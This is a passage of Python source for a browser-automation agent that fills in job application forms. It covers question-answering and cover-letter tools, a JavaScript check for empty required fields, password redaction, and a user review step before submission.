                                  "Leave it out for a word limit the question states: that stays in the question.")


class AnswerQuestionsParams(BaseModel):
    questions: list[FormQuestion]


class FillAnswerParams(BaseModel):
    index: int = Field(description="The index of the text box (a textarea, input or rich-text editor)")
    answer: int = Field(description="The answer's number, as answer_questions numbered it")


async def _no_answers(questions: list[dict]) -> list[dict]:
    """The answerer when a run has none: nothing is known, so nothing is stated."""
    return [{"question": q["question"], "options": q.get("options") or [], "kind": "fact", "source": "needs_you",
             "answer": "", "because": "", "bank_id": "", "flags": []} for q in questions]


def _question_key(question: str) -> str:
    return " ".join(re.findall(r"[a-z0-9]+", str(question or "").lower()))


def _answer_line(n: int, result: dict) -> str:
    question = result["question"]
    if result["source"] == "needs_you" or not result["answer"]:
        return (f'{n}. "{question}": LEAVE BLANK. Only the candidate can answer this; don\'t pick or type '
                f"anything for it.")
    if result["kind"] == "written":
        return (f'{n}. "{question}": a written answer ({len(result["answer"])} characters). Put it in with '
                f"fill_answer(index=<the text box's index>, answer={n}); never type it yourself.")
    verb = "choose" if result.get("options") else "enter"
    return f'{n}. "{question}": {verb} "{result["answer"]}"'


def _add_fill_answer(tools, browser_session, numbered: dict[int, dict]) -> None:
    """Register fill_answer, which pastes answer `numbered[n]` whole into a text box."""
    @tools.action(
        "Put a written answer into its text box in one step: give the box's index and the answer's number. It "
        "replaces whatever the box holds.",
        param_model=FillAnswerParams)
    async def fill_answer(params: FillAnswerParams) -> ActionResult:
        result = numbered.get(params.answer)
        if not result or not result.get("answer"):
            return ActionResult(error=f"There's no answer numbered {params.answer} to fill in.")
        node = await browser_session.get_element_by_index(params.index)
        if node is None:
            return ActionResult(error=f"Element index {params.index} isn't available - the page may have changed.")
        text = result["answer"]
        try:
            held = await _paste_text(browser_session, node, text)
        except Exception as exc:
            return ActionResult(error=f"Couldn't fill element {params.index}: {type(exc).__name__}: {exc}"[:300])
        if " ".join(held.split()) != " ".join(text.split()):
            return ActionResult(error=f"Filled, but element {params.index} now holds {len(held)} characters, not "
                                      f"the answer's {len(text)}: check it is the box for that question.")
        done = f"Filled answer {params.answer} ({len(text)} characters) into element {params.index}."
        return ActionResult(extracted_content=done, long_term_memory=done)


def _apply_tools(cover_letter: str, browser_session, answerer: Answerer | None = None,
                 asked: dict[str, dict] | None = None) -> "Tools":
    """The fill agent's tools: the password-scoped set, answer_questions and fill_answer (recording what
    was answered in `asked`, by question), and paste_cover_letter when there's a letter."""
    tools = _secret_scoped_tools()
    answerer = answerer or _no_answers
    asked = asked if asked is not None else {}
    numbered: dict[int, dict] = {}

    @tools.action(
        "Get the candidate's answers to the form's questions: every question except name, contact details, "
        "education and employment history, and file uploads. Call it once per page with all of the page's "
        "questions, before filling them in, and give each one's label exactly as shown, with its options for a "
        "dropdown, radio or checkbox question. Then fill in exactly what it returns.",
        param_model=AnswerQuestionsParams)
    async def answer_questions(params: AnswerQuestionsParams) -> ActionResult:
        questions = [q.model_dump() for q in params.questions if q.question.strip()]
        if not questions:
            return ActionResult(error="Give at least one question.")
        try:
            results = await answerer(questions)
        except Exception as exc:
            logger.warning("answering the form's questions failed: %s", exc)
            results = await _no_answers(questions)
        lines = []
        for result in results:
            n = len(numbered) + 1
            numbered[n] = result
            asked[_question_key(result["question"])] = result
            lines.append(_answer_line(n, result))
        text = "Answers:\n" + "\n".join(lines)
        return ActionResult(extracted_content=text, long_term_memory=text)

    _add_fill_answer(tools, browser_session, numbered)
    if not cover_letter.strip():
        return tools

    @tools.action(
        "Fill a cover-letter text box with the candidate's whole cover letter in one step: give the index of "
        "the box (a textarea or rich-text editor). It replaces whatever the box holds. Use this instead of "
        "typing the letter.")
    async def paste_cover_letter(index: int) -> ActionResult:
        node = await browser_session.get_element_by_index(index)
        if node is None:
            return ActionResult(error=f"Element index {index} isn't available - the page may have changed.")
        try:
            held = await _paste_text(browser_session, node, cover_letter)
        except Exception as exc:
            return ActionResult(error=f"Couldn't paste into element {index}: {type(exc).__name__}: {exc}"[:300])
        if " ".join(held.split()) != " ".join(cover_letter.split()):
            return ActionResult(error=f"Pasted, but element {index} now holds {len(held)} characters, not the "
                                      f"letter's {len(cover_letter)}: check it is the cover-letter box.")
        done = f"Pasted the whole cover letter ({len(cover_letter)} characters) into element {index}."
        return ActionResult(extracted_content=done, long_term_memory=done)

    return tools


# Labels of required form fields still empty, read from the page: the agent's own "Needs your input"
# list is written from memory and missed a required dropdown in a live run. Covers native inputs,
# selects, radio/checkbox groups, rich-text boxes and react-select style comboboxes, whose <input>
# stays empty once an option is picked (the pick shows as a "single-value" element or in a hidden
# input beside it). A field is required when marked so or when its label ends in "*". Checked
# against a live Greenhouse form, whose dropdowns are react-select.
_EMPTY_REQUIRED_JS = r"""() => {
  const docs = [document];
  for (const frame of document.querySelectorAll('iframe')) {
    try { if (frame.contentDocument) docs.push(frame.contentDocument); } catch (e) {}
  }
  const text = node => (node && node.textContent) || '';
  const clean = t => t.replace(/\*/g, ' ').replace(/\s+/g, ' ').trim();
  const starred = t => /\*\s*$/.test(t.trim());
  const shown = el => {
    const style = el.ownerDocument.defaultView.getComputedStyle(el);
    const box = el.getBoundingClientRect();
    return style.display !== 'none' && style.visibility !== 'hidden' && (box.width > 0 || box.height > 0);
  };
  const markedRequired = el => el.required || el.getAttribute('aria-required') === 'true';
  const labelOf = (el, doc) => {
    if (el.labels && el.labels.length) return text(el.labels[0]);
    const ids = (el.getAttribute('aria-labelledby') || '').split(/\s+/).filter(Boolean);
    if (ids.length) return ids.map(id => text(doc.getElementById(id))).join(' ');
    if (el.getAttribute('aria-label')) return el.getAttribute('aria-label');
    const set = el.closest('fieldset');
    if (set && set.querySelector('legend')) return text(set.querySelector('legend'));
    return el.getAttribute('placeholder') || el.getAttribute('name') || '';
  };
  const controls = 'input:not([type=hidden]), select, textarea, [contenteditable=true]';
  // The widest ancestor holding no other form control: the field's own widget.
  const ownBox = el => {
    let box = el;
    while (box.parentElement && box.parentElement.querySelectorAll(controls).length === 1) box = box.parentElement;
    return box;
  };
  const pickedInBox = el => {
    const box = ownBox(el);
    if (box.querySelector('[class*=single-value], [class*=singleValue], [class*=multi-value], [class*=multiValue]')) return true;
    return [...box.querySelectorAll('input[type=hidden]')].some(h => h.value);
  };
  const found = [];
  const groupsSeen = new Set();
  for (const doc of docs) {
    for (const el of doc.querySelectorAll(controls)) {
      const type = (el.getAttribute('type') || '').toLowerCase();
      if (['submit', 'button', 'reset', 'image', 'file'].includes(type) || el.disabled) continue;
      // e.g. the unlabelled required stub react-select renders while it has no value
      if (el.closest('[aria-hidden=true]')) continue;
      if (type === 'radio' || type === 'checkbox') {
        const key = el.name || el.id || labelOf(el, doc);
        if (groupsSeen.has(key)) continue;
        groupsSeen.add(key);
        const group = el.name ? [...doc.querySelectorAll('input[type=' + type + ']')].filter(g => g.name === el.name) : [el];
        const set = el.closest('fieldset');
        const legend = set && set.querySelector('legend') ? text(set.querySelector('legend')) : '';
        const label = type === 'radio' || group.length > 1 ? (legend || labelOf(el, doc)) : labelOf(el, doc);
        const required = group.some(markedRequired) || starred(label) || (set && set.getAttribute('aria-required') === 'true');
        if (required && group.some(shown) && !group.some(g => g.checked)) found.push(clean(label));
        continue;
      }
      const combobox = el.getAttribute('role') === 'combobox';
      if (!shown(el) && !combobox) continue;
      const label = labelOf(el, doc);
      if (!markedRequired(el) && !starred(label)) continue;
      let empty;
      if (el.getAttribute('contenteditable') === 'true') empty = !el.textContent.trim();
      else if (combobox && el.tagName === 'INPUT') empty = !el.value.trim() && !pickedInBox(el);
      else empty = !String(el.value || '').trim();
      if (empty) found.push(clean(label) || 'A required field with no label');
    }
  }
  return JSON.stringify([...new Set(found)]);
}"""


async def _empty_required_fields(browser_session) -> list[str]:
    """Labels of the required fields still empty on the focused page; [] if it can't be read."""
    try:
        page, _ = await _focused_page(browser_session)
        labels = json.loads(await page.evaluate(_EMPTY_REQUIRED_JS))
    except Exception as exc:
        logger.debug("empty-field check failed: %s", exc)
        return []
    return [str(label)[:150] for label in labels if str(label).strip()][:25] if isinstance(labels, list) else []


def _with_empty_fields(notes: str, empty: list[str], left_blank: list[str] = ()) -> str:
    """The agent's notes, headed by the questions left blank for the candidate (answer_questions had no
    answer) and the required fields the page shows as still empty (one of those questions isn't repeated)."""
    blank_keys = [_question_key(q) for q in left_blank]
    empty = [label for label in empty
             if not any(k and (k in _question_key(label) or _question_key(label) in k) for k in blank_keys)]
    blocks = []
    if left_blank:
        blocks.append("Questions only you can answer (left blank):\n" + "\n".join(f"- {q}" for q in left_blank))
    if empty:
        blocks.append("Required fields still empty on the form:\n" + "\n".join(f"- {label}" for label in empty))
    return "\n\n".join(blocks + [notes]).strip()


async def apply_with_browser(
    job_url: str,
    cv_profile: dict,
    cover_letter: str,
    instruction_queue: asyncio.Queue,
    frame_queue: asyncio.Queue | None = None,
    job_email: str = "",
    job_password: str = "",
    cv_path: str = "",
    cover_letter_path: str = "",
    answerer: Answerer | None = None,
) -> AsyncGenerator[dict, None]:
    """
    Async generator: the browser-use agent fills the application, then the user reviews it and
    decides whether to submit (see module docstring). The CV and cover-letter PDFs are uploaded
    under the candidate's name ("Ada_Lovelace_CV.pdf"), not their stored ids. `answerer` answers the
    form's questions (answers.answer_questions); without one, every question is left for the user.
    Yields dicts:
      { action, screenshot (base64|None), blocked (bool), reason (str|None), done (bool),
        interactive (bool, optional), submitted (bool, only on the final done event),
        notes (str, only on the first review event: the agent's summary, "Needs your input" first),
        questions (list, only on the first review event: each question answer_questions answered,
                   with its answer and source) }
    The browser is always killed on exit — including when the client disconnects mid-run.
    """
    if not BROWSER_USE_AVAILABLE:
        yield {
            "action": "browser-use not installed — please rebuild the Docker image",
            "screenshot": None, "blocked": False, "reason": None, "done": True,
        }
        return

    yield {"action": "Browser agent starting…", "screenshot": None, "blocked": False, "reason": None, "done": False}

    llm = _make_browser_llm()
    browser_session = BrowserSession(browser_profile=_browser_profile())

    step_queue: asyncio.Queue = asyncio.Queue()

    async def on_step(browser_state, agent_output, step_number):
        screenshot = getattr(browser_state, "screenshot", None)  # base64; None when use_vision=False
        if frame_queue is not None and screenshot:
            _push_frame(frame_queue, screenshot)
        goal = getattr(agent_output, "next_goal", "") or ""
        actions = getattr(agent_output, "action", None) or []
        action_str = _redact(str(goal or (actions[0] if actions else agent_output)), job_password)[:120]
        await step_queue.put({
            "action": f"Step {step_number}: {action_str}",
            "screenshot": screenshot,
            "blocked": False,
            "reason": None,
            "done": False,
        })

    scope = _credential_scope(job_url)
    sensitive_data = {scope: {"job_password": job_password}} if (job_password and scope) else None

    agent_task: asyncio.Task | None = None
    screencast_task: asyncio.Task | None = None
    upload_dir = ""
    asked: dict[str, dict] = {}   # question key → its latest answer, filled in by answer_questions
    _register_secret(job_password)  # masked in logs until the finally below
    try:
        # Named copies for the upload, removed in the finally below.
        upload_dir = tempfile.mkdtemp(prefix="windrush-apply-")
        cv_upload = _named_copy(cv_path, upload_dir, _upload_name(cv_profile, "CV"))
        letter_upload = _named_copy(cover_letter_path, upload_dir, _upload_name(cv_profile, "Cover Letter"))
        task = _build_task(job_url, cv_profile, cover_letter, job_email, job_password, cv_upload, letter_upload)
        agent = Agent(
            task=task,
            llm=llm,
            browser_session=browser_session,
            register_new_step_callback=on_step,
            use_vision=False,
            available_file_paths=[path for path in (cv_upload, letter_upload) if path],
            tools=_apply_tools(cover_letter, browser_session, answerer, asked),
            sensitive_data=sensitive_data,
            # The judge LLM call grades the run from the RAW step history, which browser-use does not
            # redact — e.g. an evaluate() that reads the form back carries the typed password. We
            # rely on the agent's own is_successful(), so the judge only costs a call and leaks.
            use_judge=False,
            # Open the job page before step 1. browser-use's own directly_open_url guesses the URL
            # from the task text and gives up when it sees more than one URL-like string — which a
            # persona's LinkedIn/GitHub links or a cover letter mentioning "ASP.NET" always trigger.
            initial_actions=[{"navigate": {"url": job_url, "new_tab": False}}],
        )
        agent_task = asyncio.create_task(agent.run(max_steps=_MAX_FILL_STEPS))
        if frame_queue is not None:
            screencast_task = asyncio.create_task(_cdp_screencaster(browser_session, frame_queue))

        # Stream step events while the agent fills the form
        while not agent_task.done():
            try:
                yield await asyncio.wait_for(step_queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                pass
        while not step_queue.empty():
            yield step_queue.get_nowait()

        agent_error = ""
        ready = False
        notes = ""
        try:
            history = agent_task.result()
            ready = bool(history.is_successful())  # agent's own verdict: "form filled, ready to submit"
            # Its summary starts with the "Needs your input" list, so it goes to the user whole,
            # not squeezed into the one-line header. browser-use has put the real password back
            # wherever the agent wrote the placeholder, so mask it before capping the length.
            notes = _redact(history.final_result() or "", job_password).strip()[:_MAX_NOTES_CHARS]
        except Exception as exc:
            agent_error = _redact(str(exc), job_password) or type(exc).__name__
            logger.warning("browser agent failed: %s", agent_error)

        if not _has_page(browser_session):
            yield {"action": f"Browser error: {agent_error or 'no page was opened'}", "screenshot": None,
                   "blocked": False, "reason": None, "done": True}
            return

        summary = notes
        empty = await _empty_required_fields(browser_session)
        questions = list(asked.values())
        left_blank = [q["question"] for q in questions if q["source"] == "needs_you"]
        notes = _with_empty_fields(summary, empty, left_blank)[:_MAX_NOTES_CHARS]

        async def put_answers_on_form(answers: list[dict]) -> dict:
            ok, detail = await _fill_with_agent(llm, browser_session, sensitive_data, answers, job_password)
            for a in answers:
                key = _question_key(a["question"])
                asked[key] = {**asked.get(key, {"bank_id": ""}), "question": asked.get(key, a)["question"],
                              "options": a["options"], "kind": a["kind"], "source": "saved", "answer": a["answer"],
                              "because": "Your answer in this review", "flags": []}
            questions = list(asked.values())
            blank = [q["question"] for q in questions if q["source"] == "needs_you"]
            still_empty = await _empty_required_fields(browser_session)
            count = f"{len(answers)} answer{'' if len(answers) == 1 else 's'}"
            if ok:
                action = f"Filled in your {count} — check them on the page before you submit"
            else:
                action = f"Couldn't put every answer on the form{': ' + detail if detail else ''} — check the page"
            # The first pass's summary still lists these questions as needing you, so it gives way to what
            # this pass did.
            done = f"From your review: {detail}" if detail else ""
            return {"action": action[:300], "questions": questions,
                    "notes": _with_empty_fields(done, still_empty, blank)[:_MAX_NOTES_CHARS]}
        see_notes = " — see the agent's notes" if notes else ""
        if agent_error:
            intro = f"The agent hit a problem — handing control to you ({agent_error})"
            reason = "Finish the form yourself, then type 'submit' (or 'done' if you submitted it), or 'skip'."
        elif ready and left_blank:
            count = f"{len(left_blank)} question{'' if len(left_blank) == 1 else 's'} only you can answer"
            intro = f"Form filled, but {count} — see the notes"
            reason = "Answer them on the form by clicking/typing, then type 'submit' to send it — or 'skip' to cancel."
        elif ready and empty:
            count = f"{len(empty)} required field{'' if len(empty) == 1 else 's'}"
            intro = f"Form filled, but {count} still empty — see the notes"
            reason = "Fill them in by clicking/typing, then type 'submit' to send it — or 'skip' to cancel."
        elif ready:
            intro = "Form filled — review it before anything is sent" + see_notes
            reason = "Type 'submit' to send it, click/type to fix anything first, or 'skip' to cancel."
        else:
            intro = "The agent couldn't finish the form" + see_notes
            reason = "Take over by clicking/typing, then 'submit' (or 'done' if you submitted it), or 'skip'."

        async for step in _interactive_session(
            browser_session, instruction_queue, intro, reason,
            on_submit=lambda: _submit_with_agent(llm, browser_session, sensitive_data, job_password),
            notes=notes, questions=questions, on_answers=put_answers_on_form,
        ):
            yield step
            if step.get("done"):
                return
    finally:
        # Runs on normal completion AND when the client disconnects (generator closed):
        # stop background work and kill Chromium so no browser process is leaked.
        for t in (agent_task, screencast_task):
            if t and not t.done():
                t.cancel()
                try:
                    await t
                except BaseException:
                    pass
        try:
            await browser_session.kill()
        except Exception as exc:
            logger.debug("browser kill failed: %s", exc)
        finally:
            _unregister_secret(job_password)
            if upload_dir:
                shutil.rmtree(upload_dir, ignore_errors=True)
